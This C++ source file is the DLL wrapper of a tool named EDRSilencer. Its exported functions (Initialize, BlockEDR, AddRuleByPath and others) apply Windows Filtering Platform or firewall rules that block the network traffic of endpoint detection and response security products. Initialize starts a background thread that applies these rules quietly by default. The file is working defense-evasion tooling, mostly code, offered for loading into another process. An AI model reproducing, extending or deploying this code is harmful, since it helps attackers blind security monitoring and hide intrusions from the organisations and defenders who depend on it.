#include "core.hpp"
#include "firewall.hpp"
#include <string>

using namespace EDRSilencer;

namespace EDRSilencer {
CRITICAL_SECTION g_critSec;
BOOL g_isQuiet = FALSE;
BOOL g_isForce = FALSE;
BOOL g_isFirewallMode = FALSE;
HANDLE g_hHeap = NULL; // Keep for now, as it is used in other files.
}

DWORD WINAPI BlockerThread(LPVOID lpParam) {
    (void)lpParam; // Unused
    g_isQuiet = TRUE; // Run quietly by default
    if (CheckProcessIntegrityLevel()) {
        if (g_isFirewallMode) {
            FirewallConfigureBlockRules();
        } else {
            configureNetworkFilters();
        }
    }
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    (void)hinstDLL;
    (void)lpvReserved;

    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            g_hHeap = HeapCreate(0, 0, 0);
            if (g_hHeap == NULL) return FALSE;
            InitializeCriticalSection(&g_critSec);
            break;

        case DLL_PROCESS_DETACH:
            DeleteCriticalSection(&g_critSec);
            if (g_hHeap) HeapDestroy(g_hHeap);
            break;
    }
    return TRUE;
}

extern "C" {
    __declspec(dllexport) void Initialize(void) {
        HANDLE hThread = CreateThread(NULL, 0, BlockerThread, NULL, 0, NULL);
        if (hThread) {
            CloseHandle(hThread);
        }
    }

    __declspec(dllexport) void SetMode(BOOL useFirewall) {
        EnterCriticalSection(&g_critSec);
        g_isFirewallMode = useFirewall;
        LeaveCriticalSection(&g_critSec);
    }

    __declspec(dllexport) void BlockEDR(BOOL quiet) {
        EnterCriticalSection(&g_critSec);
        g_isQuiet = quiet;
        if (CheckProcessIntegrityLevel()) {
            if (g_isFirewallMode) {
                FirewallConfigureBlockRules();
            } else {
                configureNetworkFilters();
            }
        }
        LeaveCriticalSection(&g_critSec);
    }

    __declspec(dllexport) void ListRules(BOOL quiet) {
        EnterCriticalSection(&g_critSec);
        g_isQuiet = quiet;
        if (CheckProcessIntegrityLevel()) {
            if (g_isFirewallMode) {
                PRINTF("[!] Listing rules is only implemented for WFP mode.\n");
                PRINTF("    Use standard Windows commands to view firewall rules, e.g.:\n");
                PRINTF("    > netsh advfirewall firewall show rule name=all | findstr EDRSilencer\n");
            } else {
                listRules();
            }
        }
        LeaveCriticalSection(&g_critSec);
    }

    __declspec(dllexport) void AddRuleByPath(BOOL quiet, const char* processPath) {
        EnterCriticalSection(&g_critSec);
        g_isQuiet = quiet;
        if (processPath && CheckProcessIntegrityLevel()) {
            if (g_isFirewallMode) {
                FirewallAddRuleByPath(processPath);
            } else {
                addProcessRule(processPath);
            }
        }
        LeaveCriticalSection(&g_critSec);
    }

    __declspec(dllexport) void RemoveAllRules(BOOL quiet) {
        EnterCriticalSection(&g_critSec);
        g_isQuiet = quiet;
        if (CheckProcessIntegrityLevel()) {
            if (g_isFirewallMode) {
                FirewallRemoveAllRules();
            } else {
                removeAllRules(FALSE);
            }
        }
        LeaveCriticalSection(&g_critSec);
    }

    __declspec(dllexport) void RemoveRuleByID(BOOL quiet, const char* ruleIdOrNameStr) {
        EnterCriticalSection(&g_critSec);
        g_isQuiet = quiet;
        if (ruleIdOrNameStr && CheckProcessIntegrityLevel()) {
            if (g_isFirewallMode) {
                FirewallRemoveRuleByPath(ruleIdOrNameStr);
            } else {
                char *endptr;
                UINT64 ruleId = CustomStrToULL(ruleIdOrNameStr, &endptr);
                if (endptr != ruleIdOrNameStr) {
                    removeRuleById(ruleId);
                }
            }
        }
        LeaveCriticalSection(&g_critSec);
    }
}
